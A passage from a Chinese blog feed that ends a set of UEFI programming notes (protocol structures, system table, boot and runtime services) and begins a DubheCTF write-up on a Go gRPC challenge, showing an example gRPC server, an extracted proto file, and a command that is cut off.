class="hljs-number">0x00</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3B</span> &#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\Include\Protocol\BlockIo.h</span><br><br><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_BLOCK_READ)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_BLOCK_IO_PROTOCOL          *This,</span><br><span class="hljs-params">  IN UINT32                         MediaId,</span><br><span class="hljs-params">  IN EFI_LBA                        Lba,</span><br><span class="hljs-params">  IN UINTN                          BufferSize,</span><br><span class="hljs-params">  OUT VOID                          *Buffer</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h2 id="Protocol在UEFI内核中的表示"><a href="#Protocol在UEFI内核中的表示" class="headerlink" title="Protocol在UEFI内核中的表示"></a>Protocol在UEFI内核中的表示</h2><ul><li><p>EFI_HANDLE：UEFI用于表示指向一个对象的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> VOID *EFI_HANDLE;<br></code></pre></td></tr></table></figure><ul><li>Controller：一个EFI_HANDLE对象<ul><li>用于控制设备</li><li>UEFI扫描总线后会为所有设备建立一个Controller</li></ul></li><li>Image：也是一个EFI_HANDLE对象<ul><li>.efi文件被加载进内存后建立</li></ul></li></ul></li><li><p>IHANDLE：EFI_HANDLE指向的对象表示结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN         Signature;<br>  <span class="hljs-comment">/// All handles list of IHANDLE</span><br>  LIST_ENTRY    AllHandles;<br>  <span class="hljs-comment">/// List of PROTOCOL_INTERFACE&#x27;s for this handle</span><br>  LIST_ENTRY    Protocols;<br>  UINTN         LocateRequest;<br>  <span class="hljs-comment">/// The Handle Database Key value when this handle was last created or modified</span><br>  UINT64        Key;<br>&#125; IHANDLE;<br></code></pre></td></tr></table></figure></li><li><p>PROTOCOL_INTERFACE：表示handle和Protocol的接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN             Signature;<br>  <span class="hljs-comment">/// Link on IHANDLE.Protocols</span><br>  LIST_ENTRY        Link;<br>  <span class="hljs-comment">/// Back pointer</span><br>  IHANDLE           *Handle;<br>  <span class="hljs-comment">/// Link on PROTOCOL_ENTRY.Protocols</span><br>  LIST_ENTRY        ByProtocol;<br>  <span class="hljs-comment">/// The protocol ID</span><br>  PROTOCOL_ENTRY    *Protocol;<br>  <span class="hljs-comment">/// The interface value</span><br>  VOID              *Interface;<br>  <span class="hljs-comment">/// OPEN_PROTOCOL_DATA list</span><br>  LIST_ENTRY        OpenList;<br>  UINTN             OpenListCount;<br>&#125; PROTOCOL_INTERFACE;<br></code></pre></td></tr></table></figure></li><li><p>PROTOCOL_ENTRY：表示Protocol的GUID</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN         Signature;<br>  <span class="hljs-comment">/// Link Entry inserted to mProtocolDatabase</span><br>  LIST_ENTRY    AllEntries;<br>  <span class="hljs-comment">/// ID of the protocol</span><br>  EFI_GUID      ProtocolID;<br>  <span class="hljs-comment">/// All protocol interfaces</span><br>  LIST_ENTRY    Protocols;<br>  <span class="hljs-comment">/// Registerd notification handlers</span><br>  LIST_ENTRY    Notify;<br>&#125; PROTOCOL_ENTRY;<br></code></pre></td></tr></table></figure></li></ul><p>几个结构体之间的关系：</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/handle.png" class title="handle"><h2 id="如何使用Protocol"><a href="#如何使用Protocol" class="headerlink" title="如何使用Protocol"></a>如何使用Protocol</h2><p>使用Protocol的一般步骤：</p><ul><li><p>找出Protocol对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gBS-&gt;OpenProtocol / HandleProtocol / LocateProtocol<br></code></pre></td></tr></table></figure></li><li><p>使用这个Protocol提供的服务</p></li><li><p>关闭打开的Protocol</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gBs-&gt;CloseProtocol<br></code></pre></td></tr></table></figure></li></ul><h3 id="OpenProtocol"><a href="#OpenProtocol" class="headerlink" title="OpenProtocol"></a>OpenProtocol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_OPEN_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE                Handle,<span class="hljs-comment">// 指定的Handle，将查询并打开此Handle中安装的Protocol</span></span><br><span class="hljs-params">  IN  EFI_GUID                  *Protocol,<span class="hljs-comment">// 要打开的Protocol GUID</span></span><br><span class="hljs-params">  OUT VOID                      **Interface  OPTIONAL,<span class="hljs-comment">// 返回打开的Protocol对象</span></span><br><span class="hljs-params">  IN  EFI_HANDLE                AgentHandle,<span class="hljs-comment">// 打开此Protocol的Image</span></span><br><span class="hljs-params">  IN  EFI_HANDLE                ControllerHandle,<span class="hljs-comment">// 使用此Protocol的控制器</span></span><br><span class="hljs-params">  IN  UINT32                    Attributes<span class="hljs-comment">// 打开Protocol的方式</span></span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="HandleProtocol"><a href="#HandleProtocol" class="headerlink" title="HandleProtocol"></a>HandleProtocol</h3><p>OpenProtocol的简化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_HANDLE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE               Handle,</span><br><span class="hljs-params">  IN  EFI_GUID                 *Protocol,</span><br><span class="hljs-params">  OUT VOID                     **Interface</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="LocateProtocol"><a href="#LocateProtocol" class="headerlink" title="LocateProtocol"></a>LocateProtocol</h3><p>从UEFI内核中找出指定Protocol的第一个实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_LOCATE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_GUID  *Protocol,</span><br><span class="hljs-params">  IN  VOID      *Registration  OPTIONAL,</span><br><span class="hljs-params">  OUT VOID      **Interface</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="CloseProtocol"><a href="#CloseProtocol" class="headerlink" title="CloseProtocol"></a>CloseProtocol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_CLOSE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE               Handle,</span><br><span class="hljs-params">  IN EFI_GUID                 *Protocol,</span><br><span class="hljs-params">  IN EFI_HANDLE               AgentHandle,</span><br><span class="hljs-params">  IN EFI_HANDLE               ControllerHandle</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h1 id="UEFI基础服务"><a href="#UEFI基础服务" class="headerlink" title="UEFI基础服务"></a>UEFI基础服务</h1><h2 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h2><ul><li>用户空间通向系统空间的通道</li><li>DXE阶段初始化</li><li>全局结构体</li></ul><h3 id="应用程序和驱动如何访问"><a href="#应用程序和驱动如何访问" class="headerlink" title="应用程序和驱动如何访问"></a>应用程序和驱动如何访问</h3><p>系统表指针作为Image入口函数的参数传递到用户空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_IMAGE_ENTRY_POINT)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE                   ImageHandle,<span class="hljs-comment">// Image的句柄</span></span><br><span class="hljs-params">  IN  EFI_SYSTEM_TABLE             *SystemTable <span class="hljs-comment">// 系统表指针</span></span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="系统表构成"><a href="#系统表构成" class="headerlink" title="系统表构成"></a>系统表构成</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  EFI_TABLE_HEADER                   Hdr;<span class="hljs-comment">// 标准UEFI表头</span><br>  CHAR16                             *FirmwareVendor; <span class="hljs-comment">// 固件提供商</span><br>  UINT32                             FirmwareRevision; <span class="hljs-comment">// 固件版本号</span><br>  EFI_HANDLE                         ConsoleInHandle; <span class="hljs-comment">// 输入控制台的句柄</span><br>  EFI_SIMPLE_TEXT_INPUT_PROTOCOL     *ConIn;<br>  EFI_HANDLE                         ConsoleOutHandle; <span class="hljs-comment">// 输出控制台的句柄</span><br>  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL    *ConOut;<br>  EFI_HANDLE                         StandardErrorHandle;  <span class="hljs-comment">// 标准错误控制台的句柄</span><br>  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL    *StdErr;<br>  EFI_RUNTIME_SERVICES               *RuntimeServices; <span class="hljs-comment">// RT服务表</span><br>  EFI_BOOT_SERVICES                  *BootServices; <span class="hljs-comment">// BS服务表</span><br>  UINTN                              NumberOfTableEntries;  <span class="hljs-comment">// ConfigurationTable数组大小</span><br>  EFI_CONFIGURATION_TABLE            *ConfigurationTable;  <span class="hljs-comment">// 系统配置表数组</span><br>&#125; EFI_SYSTEM_TABLE;<br></code></pre></td></tr></table></figure><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>启动服务分为以下几类：</p><ul><li><p>UEFI事件服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/event.png" class title="event"></li><li><p>内存管理服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/mem.png" class title="mem"></li><li><p>Protocol管理服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/protocol.png" class title="protocol"></li><li><p>Protocol使用类服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/use.png" class title="use"></li><li><p>驱动管理服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/drive.png" class title="drive"></li><li><p>Image管理服务</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image.png" class title="image"></li><li><p>ExitBootService服务</p></li><li><p>其他</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/etc.png" class title="etc"></li></ul><h2 id="运行时服务"><a href="#运行时服务" class="headerlink" title="运行时服务"></a>运行时服务</h2><ul><li>时间服务<ul><li>读取 &#x2F; 设定系统时间</li><li>读取 &#x2F; 设定系统从睡眠中唤醒的时间</li></ul></li><li>读写系统变量服务<ul><li>读取 &#x2F; 设置系统变量</li></ul></li><li>虚拟内存服务<ul><li>将物理内存转化为虚拟内存</li></ul></li><li>其他服务</li></ul>]]></content>
    
    
    <categories>
      
      <category>UEFI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uefi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 DubheCTF pwn wp</title>
    <link href="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/"/>
    <url>/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/</url>
    
    <content type="html"><![CDATA[<p>o4最赢的一集！*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。</p><span id="more"></span><h1 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h1><p>一个go写的grpc，8.3的IDA yyds</p><p>但有个屑没想到搜文件提proto的工具准备嗯逆，重复一个打开IDA开逆——放弃——再开逆——再放弃的过程</p><h2 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h2><p>可以简单理解为远程调用函数</p><p>一个grpc server示例（部分）</p><ul><li><p>greeter_server&#x2F;main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>  <span class="hljs-string">&quot;context&quot;</span><br>  <span class="hljs-string">&quot;flag&quot;</span><br>  <span class="hljs-string">&quot;fmt&quot;</span><br>  <span class="hljs-string">&quot;log&quot;</span><br>  <span class="hljs-string">&quot;net&quot;</span><br><br>  <span class="hljs-string">&quot;google.golang.org/grpc&quot;</span><br>  pb <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  port = flag.Int(<span class="hljs-string">&quot;port&quot;</span>, <span class="hljs-number">50051</span>, <span class="hljs-string">&quot;The server port&quot;</span>)<br>)<br><br><span class="hljs-comment">// server嵌入了pb.UnimplementedGreeterServer，表示server将实现pb.GreeterServer接口的所有方法</span><br><span class="hljs-keyword">type</span> server <span class="hljs-keyword">struct</span> &#123;<br>  pb.UnimplementedGreeterServer<br>&#125;<br><br><span class="hljs-comment">// server结构体的方法，实现了pb.GreeterServer中的SayHello方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  log.Printf(<span class="hljs-string">&quot;Received: %v&quot;</span>, in.GetName())<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 同上，实现了SayHelloAgain方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello again &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  flag.Parse() <span class="hljs-comment">// 解析命令行参数</span><br>  lis, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;:%d&quot;</span>, *port)) <span class="hljs-comment">// 建立tcp监听器</span><br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    log.Fatalf(<span class="hljs-string">&quot;failed to listen: %v&quot;</span>, err)<br>  &#125;<br>  s := grpc.NewServer() <span class="hljs-comment">// 创建grpc服务器实例</span><br>  pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) <span class="hljs-comment">// 注册实例</span><br>  log.Printf(<span class="hljs-string">&quot;server listening at %v&quot;</span>, lis.Addr())<br>  <span class="hljs-keyword">if</span> err := s.Serve(lis); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">// 开始监听并处理客户端的请求</span><br>    log.Fatalf(<span class="hljs-string">&quot;failed to serve: %v&quot;</span>, err)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>hellogrpc&#x2F;hellogrpc.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span>;<br><span class="hljs-keyword">package</span> hellogrpc;<br><span class="hljs-comment">// The greeting service definition.</span><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-comment">// Sends a greeting</span><br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHelloAgain (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><span class="hljs-comment">// The request message containing the user&#x27;s name.</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>hellogrpc&#x2F;hellogrpc_grpc.pb.go（部分），只放一下上面提到的部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// UnimplementedGreeterServer must be embedded to have forward compatible implementations.</span><br><span class="hljs-keyword">type</span> UnimplementedGreeterServer <span class="hljs-keyword">struct</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHello(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHello not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHelloAgain(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHelloAgain not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> mustEmbedUnimplementedGreeterServer() &#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterGreeterServer</span><span class="hljs-params">(s grpc.ServiceRegistrar, srv GreeterServer)</span></span> &#123;<br>s.RegisterService(&amp;Greeter_ServiceDesc, srv)<br>&#125;<br></code></pre></td></tr></table></figure><p>hellogrpc&#x2F;hellogrpc.pb.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">type</span> HelloReply <span class="hljs-keyword">struct</span> &#123;<br>state         protoimpl.MessageState<br>sizeCache     protoimpl.SizeCache<br>unknownFields protoimpl.UnknownFields<br><br>Message <span class="hljs-type">string</span> <span class="hljs-string">`protobuf:&quot;bytes,1,opt,name=message,proto3&quot; json:&quot;message,omitempty&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="proto提取"><a href="#proto提取" class="headerlink" title="proto提取"></a>proto提取</h2><p>有一种神奇的工具叫 <strong>pbtk</strong> 可以从文件里提取proto ：）</p><p><em>题外话，我刚开始打CTF的时候见过这个工具，但显然我不可能记得这件事QVQ，神奇的命运的轮回（雾）</em></p><p>提出来的proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">package</span> GGBond;<br><br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;./;ggbond&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">GGBondServer</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">rpc</span> Handler(Request) <span class="hljs-keyword">returns</span> (Response)</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Request</span> &#123;<br>    <span class="hljs-keyword">oneof</span> request &#123; <span class="hljs-comment">// oneof关键字定义了一个包含多个选择项的字段（类似union）</span><br>        WhoamiRequest whoami = <span class="hljs-number">100</span>;<br>        RoleChangeRequest role_change = <span class="hljs-number">101</span>;<br>        RepeaterRequest repeater = <span class="hljs-number">102</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Response</span> &#123;<br>    <span class="hljs-keyword">oneof</span> response &#123;<br>        WhoamiResponse whoami = <span class="hljs-number">200</span>;<br>        RoleChangeResponse role_change = <span class="hljs-number">201</span>;<br>        RepeaterResponse repeater = <span class="hljs-number">202</span>;<br>        ErrorResponse error = <span class="hljs-number">444</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiRequest</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2000</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeRequest</span> &#123;<br>    <span class="hljs-type">uint32</span> role = <span class="hljs-number">1001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterRequest</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">1002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ErrorResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">4444</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="python-grpc"><a href="#python-grpc" class="headerlink" title="python grpc"></a>python grpc</h2><p>真不错，有个屑也不知道grpc还有python库：）</p><p>grpc工具包可以利用proto文件生成grpc服务类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m grpc_tools.protoc 